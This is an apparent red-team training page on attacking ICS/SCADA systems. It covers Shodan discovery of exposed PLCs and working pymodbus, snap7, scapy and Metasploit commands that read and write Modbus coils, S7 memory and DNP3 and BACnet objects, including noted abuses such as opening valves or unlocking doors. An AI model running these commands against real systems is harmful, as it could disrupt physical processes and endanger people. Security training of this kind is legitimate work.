---
layout: training-page
title: "Industrial / ICS / SCADA — Red Team Academy"
module: "IoT Hacking"
tags:
  - ics
  - scada
  - modbus
  - dnp3
  - bacnet
  - s7comm
  - industrial
page_key: "iot-industrial"
render_with_liquid: false
---

# Industrial Control Systems (ICS/SCADA)

Industrial systems — PLCs, RTUs, HMIs, and SCADA servers — run critical infrastructure. They use specialized protocols (Modbus, DNP3, BACnet, EtherNet/IP, Siemens S7) that were designed without authentication. Shodan exposes thousands of internet-connected ICS devices. Attacks range from passive reconnaissance to write coils/registers to disrupt physical processes.

## Discovery & Shodan Recon

```
# Shodan queries for ICS/SCADA:
shodan search "port:502"              # Modbus
shodan search "port:102"              # Siemens S7comm
shodan search "port:20000"            # DNP3
shodan search "port:47808"            # BACnet
shodan search "port:44818"            # EtherNet/IP (Allen-Bradley)
shodan search "Siemens SIMATIC"
shodan search "Schneider Electric"
shodan search "GE SRTP"              # GE SRTP protocol port 18245
shodan search "port:102 product:s7comm"

# NMAP ICS service detection scripts:
nmap -sV -p 102,502,20000,44818,47808 TARGET

# Nmap ICS NSE scripts:
nmap -sU -p 47808 --script bacnet-info TARGET       # BACnet discovery
nmap -p 102 --script s7-info TARGET                 # Siemens S7
nmap -p 502 --script modbus-discover TARGET         # Modbus
nmap -p 44818 --script enip-info TARGET             # EtherNet/IP

# Redpoint ICS Nmap scripts (additional):
# https://github.com/digitalbond/Redpoint
```

## Modbus Exploitation

```
# Modbus TCP — port 502 — NO AUTHENTICATION
# Read/write coils (digital I/O) and registers (analog values)
# Used in: power meters, PLCs, water treatment, manufacturing

# mbtget — simple Modbus read tool:
pip3 install mbtget
mbtget -r 1 -a TARGET   # read 1 holding register from address 1
mbtget -R 0 -c 100 -a TARGET   # read 100 coils from address 0

# modbus-cli:
gem install modbus-cli
modbus read TARGET 1 10      # read 10 registers starting at address 1
modbus write TARGET 1 0xFF   # write value to coil 1

# Python pymodbus:
pip3 install pymodbus
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('TARGET', port=502)
c.connect()

# Read holding registers:
result = c.read_holding_registers(0, 10, unit=1)
print('Registers:', result.registers)

# Read coils (digital outputs):
result = c.read_coils(0, 8, unit=1)
print('Coils:', result.bits)

# WRITE coil (turn on digital output):
c.write_coil(0, True, unit=1)   # DANGEROUS — could open valve, start motor, etc.

# WRITE register:
c.write_register(1, 1500, unit=1)   # set analog value
c.close()
"

# ModbusPal — GUI Modbus simulator/tool (Java)
# ICSsploit — ICS-specific exploitation framework
```

## Siemens S7 Protocol (S7comm)

```
# S7comm — Siemens-proprietary protocol over port 102 (ISO-TSAP)
# Used in: Siemens S7-300, S7-400, S7-1200, S7-1500 PLCs
# Stuxnet targeted S7 PLCs

# python-snap7 library:
pip3 install python-snap7
python3 -c "
import snap7
client = snap7.client.Client()
client.connect('TARGET', 0, 1)   # IP, rack, slot

# Read CPU info:
info = client.get_cpu_info()
print(info)

# Read memory block DB1:
data = client.db_read(1, 0, 100)   # DB number, start, size
print(data.hex())

# Write to DB (DANGEROUS):
# client.db_write(1, 0, bytes([0x01, 0x00, ...]))

client.disconnect()
"

# Metasploit S7 modules:
use auxiliary/scanner/scada/siemens_s7_300
set RHOSTS TARGET
run

# PLCScan:
python3 PLCscan.py -p 102 TARGET

# S7-Password bypass (older firmware):
# CVE-2019-13945 — Siemens S7-1200/S7-1500 RCE
# CVE-2022-38465 — S7-1500 private key extraction
```

## DNP3 Protocol

```
# DNP3 (Distributed Network Protocol 3) — port 20000
# Used in: electric utilities, water/wastewater, oil & gas
# RTUs (Remote Terminal Units) and substation automation

# Aegis IDS for DNP3 traffic analysis
# ICS-CERT recommends monitoring for:
# - Unsolicited responses
# - Broadcast packets to 0xFFFF

# scapy for DNP3 packet crafting:
pip3 install scapy
python3 -c "
from scapy.all import *
from scapy.contrib.dnp3 import *

# DNP3 read request:
pkt = IP(dst='TARGET')/TCP(dport=20000)/DNP3(
    src=3, dst=1,
    data=DNP3ApplicationRequest(
        function_code=1  # READ
    )
)
send(pkt)
"

# Aegis — DNP3 fuzzer:
# https://github.com/automatak/aegis

# DNP3 Secure Authentication (SA) — optional, often disabled
# Without SA: no authentication — read/write any object

# OpenDNP3 library for testing:
git clone https://github.com/dnp3/opendnp3
```

## BACnet Exploitation

```
# BACnet — Building Automation Control network — UDP port 47808 (0xBAC0)
# Used in: HVAC, lighting, access control, elevators
# Offices, hospitals, data centers

# BACnet discovery — broadcast Who-Is:
nmap -sU -p 47808 --script bacnet-info LAN_CIDR

# bacpypes (Python BACnet library):
pip3 install bacpypes
python3 -c "
from bacpypes.core import run
from bacpypes.app import BIPSimpleApplication
from bacpypes.object import get_object_class
# ... (setup BACnet application)
# Read Present_Value of ANALOG_INPUT object
"

# BACnet Scan:
git clone https://github.com/sourceperl/bacnet.scanner

# What you can do on unprotected BACnet:
# - Read all sensor values (temperature, humidity, CO2)
# - Write to analog/binary outputs (set HVAC temperature)
# - Override binary outputs (unlock doors, disable fire suppression)
# - Read configuration and device schedules

# Common BACnet object types:
# ANALOG_INPUT (1), ANALOG_OUTPUT (2), ANALOG_VALUE (3)
# BINARY_INPUT (4), BINARY_OUTPUT (5), BINARY_VALUE (6)
```

## EtherNet/IP (Allen-Bradley)

```
# EtherNet/IP — TCP port 44818, UDP port 2222
# Used in: Allen-Bradley Logix PLCs, Rockwell Automation
# Common in manufacturing, automotive, food/beverage

# Nmap EtherNet/IP discovery:
nmap -p 44818 --script enip-info TARGET

# cpppo — EtherNet/IP Python library:
pip3 install cpppo
python3 -m cpppo.server.enip.client --print --address TARGET:44818 'Heartbeat[0-9]'

# EtherNet/IP identity request:
python3 -c "
import socket, struct
# Send List Identity request
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('TARGET', 44818))
list_identity = struct.pack('<HHIII', 0x0065, 0, 0, 0, 0)  # List Identity
sock.send(list_identity)
resp = sock.recv(1024)
print(resp)
sock.close()
"

# Metasploit EtherNet/IP:
use auxiliary/scanner/scada/advantech_studio_dnp3
use auxiliary/scanner/scada/moxa_nport_cmd_exec
```

## ICS Attack Tools

```
# ICSsploit — ICS exploitation framework (like Metasploit for ICS):
git clone https://github.com/dark-lbp/isf
python3 isf.py
# Modules for Modbus, S7, DNP3, BACnet, EtherNet/IP

# Grassmarlin — passive ICS network mapping:
# https://github.com/nsacyber/GRASSMARLIN
# Identifies ICS devices from PCAP without sending traffic

# Claroty/Nozomi/Dragos — commercial ICS monitoring
# (free community editions for labs)

# ICS-CERT Advisories — check vendor CVEs:
# https://www.cisa.gov/ics-advisories

# Common ICS CVEs:
# CVE-2018-10952 — Schneider Electric RCE
# CVE-2019-10953 — ABB ICS auth bypass
# CVE-2021-22657 — JTEKT TOYOPUC stack overflow
# CVE-2022-3089  — Echelon i.LON SmartServer path traversal

# Safety: NEVER run against production systems
# Always test in isolated lab environment
```

## Resources

- ICS-CERT — `cisa.gov/ics` — advisories and guidance
- ISF/ICSsploit — `github.com/dark-lbp/isf`
- GRASSMARLIN — `github.com/nsacyber/GRASSMARLIN`
- pymodbus — `github.com/pymodbus-dev/pymodbus`
- python-snap7 — Siemens S7 library
- Redpoint Nmap Scripts — `github.com/digitalbond/Redpoint`
- SANS ICS Security — `sans.org/industrial-control-systems-security`
